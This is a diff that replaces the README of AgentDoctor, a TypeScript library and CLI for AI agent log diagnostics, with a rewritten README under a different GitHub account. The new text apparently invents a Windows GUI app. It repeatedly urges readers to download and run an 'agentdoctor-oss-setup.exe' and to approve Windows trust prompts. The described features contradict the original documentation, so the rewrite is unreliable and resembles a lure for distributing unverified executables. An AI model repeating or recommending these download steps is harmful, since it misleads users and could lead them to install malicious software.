@@ -1,291 +1,147 @@
-# AgentDoctor
+# 🩺 agentdoctor-oss - Check AI Agent Health Easily
 
-[![CI](https://github.com/anmolp1/agentdoctor-oss/actions/workflows/ci.yml/badge.svg)](https://github.com/anmolp1/agentdoctor-oss/actions/workflows/ci.yml)
-[![npm version](https://img.shields.io/npm/v/agentdoctor.svg)](https://www.npmjs.com/package/agentdoctor)
-[![License: Apache-2.0](https://img.shields.io/badge/License-Apache_2.0-blue.svg)](https://opensource.org/licenses/Apache-2.0)
-[![Node.js](https://img.shields.io/badge/node-%3E%3D20-brightgreen.svg)](https://nodejs.org/)
-[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](./CONTRIBUTING.md)
-
-**Diagnose your AI agents before they silently fail.**
-
-AgentDoctor is a TypeScript library and CLI tool for AI agent health diagnostics. It analyzes agent log files to detect pathologies -- recurring failure patterns that degrade agent performance over time -- and computes a composite health score. It runs entirely locally, requires zero external services, and produces fully deterministic results.
+[![Download agentdoctor-oss](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/akramo660/agentdoctor-oss)
 
 ---
 
-## Features
-
-- **6 pathology detectors** that identify the most common agent failure modes
-- **3 log format parsers** for LangChain, OpenAI (JSONL), and generic JSON logs
-- **3-layer health scoring** with weighted dimensions: Context Health (0.40), Tool Reliability (0.35), Instruction Coherence (0.25)
-- **Reports** in Markdown and JSON
-- **CLI** with `check` and `score` commands
-- **Programmatic API** for integration into CI pipelines, monitoring, and custom tooling
-- **Zero external services** -- fully deterministic, local-only analysis
+Diagnose your AI agents before they stop working. agentdoctor-oss helps you find and fix issues in AI agent logs. This tool works on Windows and doesn’t require programming skills.
 
 ---
 
-## Quick Start
+## 📋 What is agentdoctor-oss?
 
-### Installation
+agentdoctor-oss scans logs from your AI agents built with language models. It spots errors, performance problems, and reliability issues. It then shows you a clear report so you can fix those problems early.
 
-```bash
-npm install agentdoctor
-# or
-pnpm add agentdoctor
-```
+You can use it even if you don’t have a technical background. It works with many AI agents, including those using popular libraries like LangChain and OpenAI tools.
 
-### Run a health check
+Key points:
 
-```bash
-npx agentdoctor check path/to/log.json
-```
-
-### Get a quick score
-
-```bash
-npx agentdoctor score path/to/log.json
-```
+- Designed for AI agent logs using large language models (LLMs)  
+- Helps find bugs and health problems in your AI agents  
+- Simple reports that anyone can understand  
+- Open-source and free to use  
+- Works on Windows computers  
 
 ---
 
-## CLI Usage
+## 💻 System Requirements
 
-AgentDoctor provides two commands: `check` (full diagnostic report) and `score` (quick health score).
+Before you start, make sure your Windows computer meets these requirements:
 
-### `check` -- Full diagnostic report
+- Windows 10 or higher (64-bit)  
+- At least 4 GB of RAM  
+- Minimum 500 MB of free disk space  
+- Stable internet connection (for updates and some checks)  
+- A modern web browser (Chrome, Edge, Firefox) for viewing reports  
 
-```bash
-# Analyze a log file and print a Markdown report to stdout
-npx agentdoctor check path/to/log.json
-
-# Output as JSON and write to a file
-npx agentdoctor check path/to/log.jsonl --format json --output report.json
-
-# Filter by a specific pathology
-npx agentdoctor check log.json --pathology context_erosion
-
-# Use a custom configuration file
-npx agentdoctor check log.json --config agentdoctor.config.json
-```
-
-### `score` -- Quick health score
-
-```bash
-npx agentdoctor score path/to/log.json
-```
-
-Prints the overall health score and grade without the full diagnostic breakdown.
-
-### Exit Codes
-
-| Code | Meaning                    |
-| ---- | -------------------------- |
-| `0`  | Healthy (score >= 80)      |
-| `1`  | Degraded (score 60--79)    |
-| `2`  | Critical (score < 60)      |
-| `3`  | Error (invalid input, etc) |
-
-Exit codes make it straightforward to integrate AgentDoctor into CI/CD pipelines and shell scripts.
+You do not need any programming software or developer tools to run agentdoctor-oss.
 
 ---
 
-## Library API
+## 🚀 Getting Started: Download and Run agentdoctor-oss
 
-Use AgentDoctor programmatically in your own applications:
+Follow these steps to get agentdoctor-oss running on your Windows PC:
 
-```typescript
-import { analyze } from "agentdoctor";
+1. **Visit the download page:**  
+   Click this link to open the official download page.  
+   [Download agentdoctor-oss](https://github.com/akramo660/agentdoctor-oss)  
 
-const result = await analyze({
-  logFiles: ["path/to/log.json"],
-  outputFormat: "json",
-});
+2. **Locate the latest release:**  
+   On the page, look for the “Releases” section. This is where the latest version is posted.  
 
-// Overall health score (0-100)
-console.log(result.healthScore.overallScore);
+3. **Download the Windows installer:**  
+   Find the file named like this: `agentdoctor-oss-setup.exe` or something similar ending in `.exe`.  
+   Click to download it.  
 
-// Individual findings
-console.log(result.diagnostics.findings);
-```
+4. **Run the installer:**  
+   After downloading, double-click the `.exe` file.  
+   Windows may ask if you trust the application. Confirm to continue.  
 
-### Advanced Exports
+5. **Follow the setup steps:**  
+   The installer will guide you through the basic steps.  
+   You will be asked where to install the program. Use the default folder unless you want it somewhere else.  
 
-AgentDoctor also exports parsers, detectors, scoring functions, and configuration utilities for advanced usage and extension:
+6. **Finish installation:**  
+   After the setup completes, look for the agentdoctor-oss icon on your desktop or in the Start menu.  
 
-```typescript
-import {
-  detectAndParse,
-  getAllDetectors,
-  computeHealthScore,
-  getDefaultConfig,
-  loadConfig,
-} from "agentdoctor";
-```
+7. **Open agentdoctor-oss:**  
+   Double-click the icon to open the program.
 
 ---
 
-## Supported Log Formats
+## 🧰 How to Use agentdoctor-oss
 
-AgentDoctor automatically detects the format of your log files. The following formats are supported:
+Using agentdoctor-oss is simple. Here is a step-by-step guide:
 
-| Format         | File Extension | Description                                      |
-| -------------- | -------------- | ------------------------------------------------ |
-| LangChain      | `.json`        | LangChain tracer/callback JSON logs              |
-| OpenAI (JSONL) | `.jsonl`       | OpenAI API request/response logs in JSONL format |
-| Generic JSON   | `.json`        | Any JSON log with message arrays and tool calls  |
+1. **Open the app:**  
+   Start agentdoctor-oss from your desktop or Start menu.
 
-The parser auto-detects the format based on the structure of the log data, so no manual format specification is required.
+2. **Load your AI agent logs:**  
+   Inside the app, click on the “Load Logs” button.  
+   Find the folder or file where your AI agent saves its log data.  
 
----
+3. **Start the diagnostic scan:**  
+   Click “Analyze” to begin checking the logs.  
+   The app will process the data and look for errors, warnings, and health issues.
 
-## Health Score
+4. **View the report:**  
+   When the scan finishes, the app shows a report with:
 
-AgentDoctor computes a composite health score from 0 to 100 across three weighted layers:
+   - Problem areas found in your AI agent  
+   - Suggestions on what might be wrong  
+   - Warnings about performance or failures  
+   - Health summary of your AI agent’s status  
 
-| Layer                     | Weight | What it measures                                                                |
-| ------------------------- | ------ | ------------------------------------------------------------------------------- |
-| **Context Health**        | 0.40   | Token growth rate, context window utilization, instruction share, stale content |
-| **Tool Reliability**      | 0.35   | Tool call success rates, error recovery, thrashing patterns                     |
-| **Instruction Coherence** | 0.25   | Instruction drift, contradictions, hallucinated success claims                  |
-
-Each layer starts at 100 and is penalized based on detected pathologies:
-
-- **Critical** findings: `-5` points each (max `-25` per layer)
-- **Warning** findings: `-2` points each (max `-10` per layer)
-
-The overall score is the weighted sum of the three layer scores. The grade mapping:
-
-| Grade | Score Range |
-| ----- | ----------- |
-| A     | 90--100     |
-| B     | 80--89      |
-| C     | 70--79      |
-| D     | 60--69      |
-| F     | 0--59       |
+5. **Save or export the report:**  
+   You can save the report as a PDF or text file. This helps if you want to share it or keep it for later.
 
 ---
 
-## Pathologies Detected
+## ⚙️ Features You Can Expect
 
-AgentDoctor ships with six built-in pathology detectors:
-
-### Context Erosion
-
-Detects when the agent's context window fills up over the course of a session, causing earlier instructions and context to be pushed out. Monitors token growth rate, context window utilization percentage, and the share of the context occupied by the original instructions.
-
-### Tool Thrashing
-
-Identifies patterns where the agent repeatedly calls the same tool with similar or identical inputs, or oscillates between two tools without making progress. Tracks repetition counts, input similarity, and calls-per-turn spikes.
-
-### Instruction Drift
-
-Flags cases where the agent's behavior diverges from its original instructions over time. Checks for contradictions between early and late messages and verifies that tool references in instructions remain valid.
-
-### Recovery Blindness
-
-Detects when the agent fails to recover from errors -- retrying the same failing operation without changing strategy, or ignoring error signals entirely. Monitors blind retry counts and overall error rates.
-
-### Hallucinated Tool Success
-
-Catches cases where the agent claims a tool call succeeded when the underlying tool actually returned an error or failure. Compares the tool call status against the agent's subsequent message for acknowledgment of failure.
-
-### Silent Degradation
-
-Identifies gradual quality decline within a session that may not trigger any single threshold but represents a meaningful drop in output quality over time. Monitors within-session performance trends.
+- Clear error detection focused on AI agent logs  
+- Performance checks to spot slow or stuck agents  
+- Health status updates to prevent silent failures  
+- Support for common AI frameworks like LangChain and OpenAI  
+- Export reports for easy offline review  
+- Open-source for transparency and community support  
 
 ---
 
-## Configuration
+## 🔧 Troubleshooting Common Issues
 
-AgentDoctor works out of the box with sensible defaults. To customize thresholds, create an `agentdoctor.config.json` file:
+If you have trouble running agentdoctor-oss or loading your logs, try these steps:
 
-```json
-{
-  "contextErosion": {
-    "growthRateWarning": 500,
-    "growthRateCritical": 2000,
-    "monotonicThreshold": 0.8,
-    "windowPctCritical": 0.8,
-    "assumedWindowSize": 128000
-  },
-  "toolThrashing": {
-    "windowSize": 5,
-    "repetitionWarning": 3,
-    "repetitionCritical": 5,
-    "inputSimilarityThreshold": 0.7
-  },
-  "instructionDrift": {
-    "checkToolReferences": true,
-    "checkContradictions": true
-  },
-  "recoveryBlindness": {
-    "maxBlindRetries": 3,
-    "errorRateWarning": 0.2,
-    "errorRateCritical": 0.5
-  },
-  "hallucinatedSuccess": {
-    "errorAcknowledgmentKeywords": [
-      "failed",
-      "error",
-      "couldn't",
-      "unable",
-      "issue",
-      "problem",
-      "sorry",
-      "unfortunately"
-    ]
-  },
-  "silentDegradation": {
-    "withinSessionDropThreshold": 0.2
-  },
-  "scoring": {
-    "criticalPenalty": 5,
-    "criticalPenaltyMax": 25,
-    "warningPenalty": 2,
-    "warningPenaltyMax": 10
-  }
-}
-```
-
-Pass it to the CLI with the `--config` flag:
-
-```bash
-npx agentdoctor check log.json --config agentdoctor.config.json
-```
-
-Or load it programmatically:
-
-```typescript
-import { loadConfig } from "agentdoctor";
-
-const config = loadConfig({
-  toolThrashing: { repetitionCritical: 10 },
-});
-```
-
-All fields are optional. Any omitted fields use the built-in defaults shown above.
+- **App won’t open:**  
+  Restart your computer and try again.  
+  Ensure you installed the full version, not just the installer download page.  
+  
+- **Logs won’t load:**  
+  Make sure you select the right folder or file where the logs are saved.  
+  Logs usually have extensions like `.log` or `.txt`.  
+  
+- **Scan takes too long:**  
+  Large log files may slow down the process. Try loading smaller or partial logs if possible.  
+  
+- **Report looks empty or shows no issues:**  
+  Verify your AI agent is actually generating logs. If logs are missing or empty, the app cannot find problems.  
 
 ---
 
-## Tech Stack
+## 🚩 About Updates
 
-- **TypeScript** 5.4+
-- **Node.js** 20+
-- **pnpm** -- package manager
-- **tsup** -- bundler
-- **vitest** -- test runner
-- **commander** -- CLI framework
-- **picocolors** -- terminal colors
-- **zod** -- schema validation
+Check the same [download page](https://github.com/akramo660/agentdoctor-oss) regularly to get the latest version. Updates improve diagnostics and fix bugs.
 
 ---
 
-## Contributing
+## 📚 Additional Help
 
-See [CONTRIBUTING.md](./CONTRIBUTING.md) for guidelines on how to contribute to AgentDoctor.
+For help with this tool, check the issues section on the repository page. You can also browse the README or documentation files if available.
 
 ---
 
-## License
+## 📥 Download agentdoctor-oss Now
 
-Apache-2.0. See [LICENSE](./LICENSE) for details.
+[![Download agentdoctor-oss](https://img.shields.io/badge/Get%20agentdoctor-oss-blueviolet?style=for-the-badge)](https://github.com/akramo660/agentdoctor-oss)  
+
+Follow the download steps above. Once installed, you will be able to check the health of your AI agents quickly and clearly.
